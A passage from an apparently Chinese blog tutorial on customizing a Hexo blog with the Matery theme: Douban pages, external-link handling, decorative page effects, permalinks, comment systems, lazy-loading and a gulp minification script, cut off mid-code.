class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>user:：你的豆瓣ID。打开豆瓣，登入账户，然后在右上角点击 ”个人主页“，这时候地址栏的URL大概是这样：<a href="https://www.douban.com/people/xxxxxx/" target="_blank" rel="noopener">https://www.douban.com/people/xxxxxx/</a> ，其中的”xxxxxx”就是你的个人ID了。</p><p>builtin：是否将生成页面的功能嵌入 hexo s 和 hexo g 中，默认是 false ，另一可选项为  true 。</p><p>title： 该页面的标题。</p><p>quote： 写在页面开头的一段话,支持html语法。</p><p>timeout： 爬取数据的超时时间，默认是 10000ms，如果在使用时发现报了超时的错(ETIMEOUT)可以把这个数据设置的大一点。</p><p>如果只想显示某一个页面(比如movie)，那就把其他的配置项注释掉即可。</p><p>然后再主题配置文件_config.yml中添加关于此页面的菜单：</p><hr><pre class="line-numbers language-yml"><code class="language-yml">menu:    媒体:       url: /       icon: fas fa-list       children:         - name: 电影           url: /movies           icon: fas fa-film         - name: 书单           url: /books           icon: fas fa-book         - name: 游戏           url: /games           icon: fas fa-gamepad<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>适配Matery主题：在 /themes/hexo-theme-matery/layout 文件夹下面创建一个名为 douban.ejs 的文件，并将下面的内容复制进去：</p><pre><code>    &lt;%- partial(&#39;_partial/post-cover&#39;) %&gt;     &lt;style&gt;         .hexo-douban-picture img {        width: 100%;         }     &lt;/style&gt;    &lt;main class=&quot;content&quot;&gt;     &lt;div id=&quot;contact&quot; class=&quot;container chip-container&quot;&gt;         &lt;div class=&quot;card&quot;&gt;             &lt;div class=&quot;card-content&quot; style=&quot;padding: 30px&quot;&gt;                 &lt;h1 style=&quot;margin: 10px 0 10px 0px;&quot;&gt;&lt;%= page.title %&gt;&lt;/h1&gt;                 &lt;%- page.content %&gt;             &lt;/div&gt;         &lt;/div&gt;         &lt;div class=&quot;card&quot;&gt;             &lt;div class=&quot;card-content&quot; style=&quot;text-align: center&quot;&gt;                 &lt;h3 style=&quot;margin: 5px 0 5px 5px;&quot;&gt;如果你有好的内容推荐，欢迎在下面留言！&lt;/h3&gt;             &lt;/div&gt;         &lt;/div&gt;         &lt;div class=&quot;card&quot;&gt;             &lt;% if (theme.gitalk &amp;&amp; theme.gitalk.enable) { %&gt;                &lt;%- partial(&#39;_partial/gitalk&#39;) %&gt;            &lt;% } %&gt;             &lt;% if (theme.gitment.enable) { %&gt;                 &lt;%- partial(&#39;_partial/gitment&#39;) %&gt;             &lt;% } %&gt;             &lt;% if (theme.disqus.enable) { %&gt;                 &lt;%- partial(&#39;_partial/disqus&#39;) %&gt;             &lt;% } %&gt;             &lt;% if (theme.livere &amp;&amp; theme.livere.enable) { %&gt;                 &lt;%- partial(&#39;_partial/livere&#39;) %&gt;             &lt;% } %&gt;             &lt;% if (theme.valine &amp;&amp; theme.valine.enable) { %&gt;                 &lt;%- partial(&#39;_partial/valine&#39;) %&gt;             &lt;% } %&gt;         &lt;/div&gt;     &lt;/div&gt;     &lt;/main&gt;</code></pre><p>然后在博客站点目录下的node_modules文件夹下找到hexo-douban/lib，文件夹下有三个js文件，分别为：books-generator.js 、games-generator.js 、movies-generator.js，用文本编辑器打开这三个文件，并将其文件内容末尾的代码修改为一下内容：</p><hr><pre><code>/* 原文件内容为 layout: [`page`, `post`] ，将其修改为下面的内容*/layout: [`page`, `douban`]</code></pre><p>最后就是使用并生成相应的页面，执行命令如下:</p><hr><pre class="line-numbers language-bash"><code class="language-bash">hexo douban<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>需要注意的是，通常大家都喜欢用 hexo d 来作为 hexo deploy 命令的简化，但是当安装了 hexo douban 之后，就不能用 hexo d 了，因为 hexo douban 跟 hexo deploy 的前缀都是 hexo d ，你以后执行的 hexo d 将不再是 Hexo 页面的生成，而是豆瓣页面的生成。</p><p>以下是可选的命令参数：</p><hr><pre class="line-numbers language-bash"><code class="language-bash">-h, --help    <span class="token comment" spellcheck="true"># 帮助页面</span>-b, --books   <span class="token comment" spellcheck="true"># 只生成书单页面</span>-g, --games   <span class="token comment" spellcheck="true"># 只生成游戏页面</span>-m, --movies  <span class="token comment" spellcheck="true"># 只生成电影页面</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>当站点配置文件的builtin的值为true时，生成页面的功能会嵌入到hexo g和hexo s中，在进行部署生成操作，会自动生成相应的页面。</p><h2 id="外链跳转插件"><a href="#外链跳转插件" class="headerlink" title="外链跳转插件"></a>外链跳转插件</h2><p><a href="https://www.npmjs.com/package/hexo-external-link/v/1.0.8?activeTab=explore" target="_blank" rel="noopener">hexo-external-link</a>是一个跳转外链相关插件。自动为所有html文件中外链的a标签生成对应的属性。 比如 设置target=’_blank’, rel=’external nofollow noopener noreferrer’ 告诉搜索引擎这是外部链接,不要将该链接计入权重。 同时自动生成外链跳转页面,默认在根目录下 go.html;</p><p>使用 npm 或者 yarn 安装:</p><hr><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">## npm 安装</span><span class="token function">npm</span> <span class="token function">install</span> hexo-external-link --save<span class="token comment" spellcheck="true">## yarn 安装</span>yarn add hexo-external-link<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>之后再hexo博客站点根目录下添加如下配置：</p><hr><pre class="line-numbers language-yml"><code class="language-yml">hexo_external_link:  enable: true  enable_base64_encode: true  url_param_name: 'u'  html_file_name: 'go.html'  target_blank: true  link_rel: 'external nofollow noopener noreferrer'  domain: 'your_domain' # 如果开启了防盗链，填写你的域名  safety_chain: true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>enable - 是否开启hexo_external_link插件 - 默认 false</p><p>enable_base64_encode - 是否对跳转url使用base64编码 - 默认 fasle</p><p>url_param_name - url参数名,在跳转到外链传递给html_file_name的参数名 - 默认 ‘u’</p><p>html_file_name - 跳转到外链的页面文件路径 - 默认 ‘go.html’</p><p>target_blank - 是否为外链的a标签添加target=’_blank’ - 默认 true</p><p>link_rel - 设置外链的a标签的rel属性 - 默认 ‘external nofollow noopener noreferrer’</p><p>domain - 如果开启了防盗链,除了 localhost 和 domain(你的域名) 之外调用会跳到主页,同时也是判断链接是否为外链的依据 - 默认 window.location.host</p><p>safety_chain - go.html 为了防止外链盗用 对域名进行的判断 - 默认 false<br>添加动态科技线条背景，在主题配置文件（_config.yml）激活即可。</p><h2 id="添加鼠标点击烟花爆炸效果"><a href="#添加鼠标点击烟花爆炸效果" class="headerlink" title="添加鼠标点击烟花爆炸效果"></a>添加鼠标点击烟花爆炸效果</h2><p>首先在themes/matery/source/js目录下新建fireworks.js文件，打开这个<a href="https://cdn.jsdelivr.net/gh/baifeng66/cdn@1.1/source/js/fireworks.js" target="_blank" rel="noopener">网址</a>，将内容复制粘贴到新建的fireworks.js即可。</p><p>然后再themes/matery/layout/layout.ejs文件内添加下面的内容：</p><pre><code>    &lt;canvas class=&quot;fireworks&quot; style=&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot; &gt;&lt;/canvas&gt;     &lt;script type=&quot;text/javascript&quot; src=&quot;//cdn.bootcss.com/animejs/2.2.0/anime.min.js&quot;&gt;&lt;/script&gt;     &lt;script type=&quot;text/javascript&quot; src=&quot;/js/fireworks.js&quot;&gt;&lt;/script&gt;</code></pre><p>然后</p><hr><pre class="line-numbers language-bash"><code class="language-bash">hexo clean <span class="token operator">&amp;&amp;</span> hexo g <span class="token operator">&amp;&amp;</span> hexo s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可，就可以看到效果了。</p><h2 id="添加樱花飘落效果"><a href="#添加樱花飘落效果" class="headerlink" title="添加樱花飘落效果"></a>添加樱花飘落效果</h2><p>在themes/matery/source/js目录下新建sakura.js文件，打开这个<a href="https://cdn.jsdelivr.net/gh/baifeng66/cdn@1.1/source/js/sakura.js" target="_blank" rel="noopener">网址</a>，将内容复制粘贴到新建的sakura.js即可。</p><p>然后再themes/matery/layout/layout.ejs文件内添加下面的内容：</p><hr><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"/js/sakura.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后</p><hr><pre class="line-numbers language-bash"><code class="language-bash">hexo clean <span class="token operator">&amp;&amp;</span> hexo g <span class="token operator">&amp;&amp;</span> hexo s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可，就可以看到效果了。</p><h2 id="添加雪花飘落效果"><a href="#添加雪花飘落效果" class="headerlink" title="添加雪花飘落效果"></a>添加雪花飘落效果</h2><p>在themes/matery/source/js目录下新建snow.js文件，打开这个<a href="https://cdn.jsdelivr.net/gh/baifeng66/cdn@1.1/source/js/snow.js" target="_blank" rel="noopener">网址</a>，将内容复制粘贴到新建的snow.js即可。</p><p>然后再themes/matery/layout/layout.ejs文件内添加下面的内容：</p><hr><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"/js/snow.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后</p><hr><pre class="line-numbers language-bash"><code class="language-bash">hexo clean <span class="token operator">&amp;&amp;</span> hexo g <span class="token operator">&amp;&amp;</span> hexo s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可，就可以看到效果了。</p><h2 id="添加鼠标彩虹星星掉落跟随效果"><a href="#添加鼠标彩虹星星掉落跟随效果" class="headerlink" title="添加鼠标彩虹星星掉落跟随效果"></a>添加鼠标彩虹星星掉落跟随效果</h2><p>在themes/matery/source/js目录下新建cursor.js文件，打开这个<a href="https://cdn.jsdelivr.net/gh/baifeng66/cdn@1.1/source/js/cursor.js" target="_blank" rel="noopener">网址</a>传送门，将内容复制粘贴到新建的cursor.js即可。</p><p>然后再themes/matery/layout/layout.ejs文件内添加下面的内容：</p><hr><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"/js/cursor.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后</p><hr><pre class="line-numbers language-bash"><code class="language-bash">hexo clean <span class="token operator">&amp;&amp;</span> hexo g <span class="token operator">&amp;&amp;</span> hexo s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可，就可以看到效果了。</p><h2 id="文章生成永久链接"><a href="#文章生成永久链接" class="headerlink" title="文章生成永久链接"></a>文章生成永久链接</h2><p>主题默认的文章链接配置是:</p><hr><pre class="line-numbers language-yml"><code class="language-yml">permalink: :year/:month/:day/:title<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这种生成的链接地址很长，文章版权的链接地址会出现一大串字符编码，一点也不好看。因此需要修改文章生成链接的格式。</p><p>首先再根目录下执行下面的命令：</p><hr><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-abbrlink --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后再站点配置文件下添加如下配置：</p><hr><pre class="line-numbers language-yml"><code class="language-yml">abbrlink:alg: crc16   #算法： crc16(default) and crc32rep: hex     #进制： dec(default) and hex: dec #输出进制：十进制和十六进制，默认为10进制。丨dec为十进制，hex为十六进制<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>再将站点配置文件的permalink的值修改为：</p><hr><pre class="line-numbers language-yml"><code class="language-yml">permalink: posts/:abbrlink.html  # 此处可以自己设置，也可以直接使用 :/abbrlink<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成完后，原md文件的Front-matter 内会增加abbrlink 字段，值为生成的ID 。这个字段确保了在我们修改了Front-matter 内的博客标题title或创建日期date字段之后而不会改变链接地址。</p><h2 id="添加评论系统"><a href="#添加评论系统" class="headerlink" title="添加评论系统"></a>添加评论系统</h2><h3 id="添加来必力评论系统"><a href="#添加来必力评论系统" class="headerlink" title="添加来必力评论系统"></a>添加来必力评论系统</h3><p>首先去来必力<a href="http://livere.com/" target="_blank" rel="noopener">官网</a>，点击导航栏上的安装。</p><p>City 版：是一款适合所有人使用的免费版本；<br>Premium 版：是一款能够帮助企业实现自动化管理的多功能收费版本。注册完之后，会提示你填写网站的相关信息，如网站链接，网站名称等等，填写完毕之后，会给你一段代码。</p><p>到主题配置文件里找到：</p><hr><pre class="line-numbers language-yml"><code class="language-yml"># Livere comment configuration, the default is not activated# Livere 来必力评论模块的配置，默认为不激活<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>livere:<br>  enable: true   # true即为开启评论系统<br>  uid: #这里填写你的uid<br>然后</p><hr><pre class="line-numbers language-bash"><code class="language-bash">hexo clean <span class="token operator">&amp;&amp;</span> hexo g <span class="token operator">&amp;&amp;</span> hexo s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可，就可以看到效果了。</p><h3 id="添加Valine评论系统"><a href="#添加Valine评论系统" class="headerlink" title="添加Valine评论系统"></a>添加Valine评论系统</h3><p>注册<a href="https://leancloud.cn/" target="_blank" rel="noopener">LeanCloud</a>,经过登录或者注册之后再登录，就会进入如下的页面：<br><img src="https://img.imgdb.cn/item/6003ee7f3ffa7d37b37a2ef7.jpg" alt=""><br>创建应用完成后，会出现如下页面，然后点击设置<br><img src="https://img.imgdb.cn/item/6003ee7f3ffa7d37b37a2f01.jpg" alt=""><br>会出现下面的页面，将其中APPID和APPKey复制，添加到配置文件(_config.yml)中。<br><img src="https://img.imgdb.cn/item/6003ee7f3ffa7d37b37a2eee.jpg" alt=""></p><hr><pre class="line-numbers language-yml"><code class="language-yml"># The configuration of the Valine comment module is not activated by default.# To use it, activate the configuration item and set appId and appKey.# Valine 评论模块的配置，默认为不激活，如要使用，就请激活该配置项，并设置 appId 和 appKey.valine:  enable: false  # true即为开启评论系统  appId:   #此处填写你的appid  appKey:  #此处填写你的appkey  notify: false  verify: false  visitor: true  avatar: 'mm' # Gravatar style : mm/identicon/monsterid/wavatar/retro/hide  pageSize: 10  placeholder: 'just go go' # Comment Box placeholder  background:  https://mx142.cn//medias/comment_bg.png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 然后</p><hr><pre class="line-numbers language-bash"><code class="language-bash">hexo clean <span class="token operator">&amp;&amp;</span> hexo g <span class="token operator">&amp;&amp;</span> hexo s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可，就可以看到效果了。</p><h2 id="图片懒加载"><a href="#图片懒加载" class="headerlink" title="图片懒加载"></a>图片懒加载</h2><p>安装插件：<a href="https://github.com/rqh656418510/hexo-lazyload-image-better" target="_blank" rel="noopener">hexo-lazyload-image</a><br>在站点根目录执行下面的命令：</p><hr><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-lazyload-image --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后在站点配置文件下添加下面的代码：</p><hr><pre class="line-numbers language-yml"><code class="language-yml">lazyload:  enable: true  # 是否开启图片懒加载  onlypost: false  # 是否只对文章的图片做懒加载  loadingImg: # eg ./images/loading.gif<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> 然后</p><hr><pre class="line-numbers language-bash"><code class="language-bash">hexo clean <span class="token operator">&amp;&amp;</span> hexo g <span class="token operator">&amp;&amp;</span> hexo s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可，就可以看到效果了。</p><h2 id="代码压缩"><a href="#代码压缩" class="headerlink" title="代码压缩"></a>代码压缩</h2><h3 id="gulp代码压缩"><a href="#gulp代码压缩" class="headerlink" title="gulp代码压缩"></a>gulp代码压缩</h3><p>进入站点根目录下依次执行下面的命令：</p><hr><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 全局安装gulp模块</span><span class="token function">npm</span> <span class="token function">install</span> gulp -g<span class="token comment" spellcheck="true"># 安装各种小功能模块  执行这步的时候，可能会提示权限的问题，最好以管理员模式执行</span><span class="token function">npm</span> <span class="token function">install</span> gulp gulp-htmlclean gulp-htmlmin gulp-minify-css gulp-uglify gulp-imagemin --save<span class="token comment" spellcheck="true"># 额外的功能模块</span><span class="token function">npm</span> <span class="token function">install</span> gulp-debug gulp-clean-css gulp-changed gulp-if gulp-plumber gulp-babel babel-preset-es2015 del @babel/core --save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在Hexo根目录新建文件 gulpfile.js，并复制以下内容到文件中，有中文注释，可以根据自己需求修改。（注意：文件名不能错，一定为gulpfile.js，否则会出错！）</p><pre class="line-numbers language-js"><code class="language-js">    <span class="token keyword">var</span> gulp <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> debug <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-debug"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> cleancss <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-clean-css"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//css压缩组件</span>    <span class="token keyword">var</span> uglify <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-uglify"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//js压缩组件</span>    <span class="token keyword">var</span> htmlmin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-htmlmin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//html压缩组件</span>    <span class="token keyword">var</span> htmlclean <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-htmlclean"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//html清理组件</span>    <span class="token keyword">var</span> imagemin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-imagemin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//图片压缩组件</span>    <span class="token keyword">var</span> changed <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-changed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//文件更改校验组件</span>    <span class="token keyword">var</span> gulpif <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-if"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//任务 帮助调用组件</span>    <span class="token keyword">var</span> plumber <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-plumber"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//容错组件（发生错误不跳出任务，并报出错误内容）</span>    <span class="token keyword">var</span> isScriptAll <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//是否处理所有文件，(true|处理所有文件)(false|只处理有更改的文件)</span>    <span class="token keyword">var</span> isDebug <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//是否调试显示 编译通过的文件</span>    <span class="token keyword">var</span> gulpBabel <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"gulp-babel"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> es2015Preset <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"babel-preset-es2015"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> del <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"del"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> Hexo <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"hexo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> hexo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hexo</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 初始化一个hexo对象</span>    <span class="token comment" spellcheck="true">// 清除public文件夹</span>    gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token string">"clean"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">del</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"public/**/*"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 下面几个跟hexo有关的操作，主要通过hexo.call()去执行，注意return</span>    <span class="token comment" spellcheck="true">// 创建静态页面 （等同 hexo generate）</span>    gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token string">"generate"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> hexo<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> hexo            <span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token string">"generate"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>                watch<span class="token punctuation">:</span> <span class="token boolean">false</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> hexo<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> hexo<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 启动Hexo服务器</span>    gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token string">"server"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> hexo            <span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> hexo<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token string">"server"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 部署到服务器</span>    gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token string">"deploy"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> hexo<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> hexo            <span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token string">"deploy"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>                watch<span class="token punctuation">:</span> <span class="token boolean">false</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> hexo<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> hexo<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 压缩public目录下的js文件</span>    gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token string">"compressJs"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> gulp        <span class="token punctuation">.</span><span class="token function">src</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"./public/**/*.js"</span><span class="token punctuation">,</span> <span class="token string">"!./public/libs/**"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">/</span><span class="token operator">/</span>排除的js        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">gulpif</span><span class="token punctuation">(</span><span class="token operator">!</span>isScriptAll<span class="token punctuation">,</span> <span class="token function">changed</span><span class="token punctuation">(</span><span class="token string">"./public"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">gulpif</span><span class="token punctuation">(</span>isDebug<span class="token punctuation">,</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">{</span> title<span class="token punctuation">:</span> <span class="token string">"Compress JS:"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">plumber</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>            <span class="token function">gulpBabel</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                presets<span class="token punctuation">:</span> <span class="token punctuation">[</span>es2015Preset<span class="token punctuation">]</span> <span class="token operator">/</span><span class="token operator">/</span> es5检查机制            <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">uglify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span><span class="token operator">/</span><span class="token function">调用压缩组件方法uglify</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 